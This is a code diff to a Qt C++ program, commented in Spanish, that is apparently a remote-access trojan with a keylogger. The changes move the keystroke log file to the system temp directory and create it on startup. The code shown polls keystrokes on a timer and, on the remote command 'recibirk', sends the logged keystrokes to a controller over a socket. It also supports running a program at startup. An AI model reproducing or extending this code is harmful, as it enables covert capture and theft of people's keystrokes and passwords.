@@ -94,6 +94,8 @@ void MainWindow::inicio(){
     connect(&this->verTecla,SIGNAL(timeout()),this,SLOT(escucharTeclas()));
     QApplication::setQuitOnLastWindowClosed(false);
     log.setFileName(directorio.tempPath() + "/log"); //archivo de log del keylogger
+    log.open(QFile::WriteOnly);
+    log.close();
     verTecla.setInterval(50);
     this->verTecla.start();
     if(this->ejecutar != "noejecutar") //Ejecutar un programa al inicio
@@ -304,7 +306,7 @@ void MainWindow::llegadaDatos() {
     if (parametros[0] == "recibirk")
     {
         QFile klog;
-        klog.setFileName("./log");
+        klog.setFileName(directorio.tempPath() + "/log");
         klog.open(QFile::ReadOnly);
         util.escribirSocket("teclas|@|" + klog.readAll(),&socket);
         klog.close();
@@ -315,7 +317,7 @@ void MainWindow::llegadaDatos() {
         if(this->verTecla.isActive())
         {
             this->verTecla.stop();
-            directorio.remove("./log");
+            directorio.remove(directorio.tempPath() + "/log");
             this->verTecla.start();
         }
         else
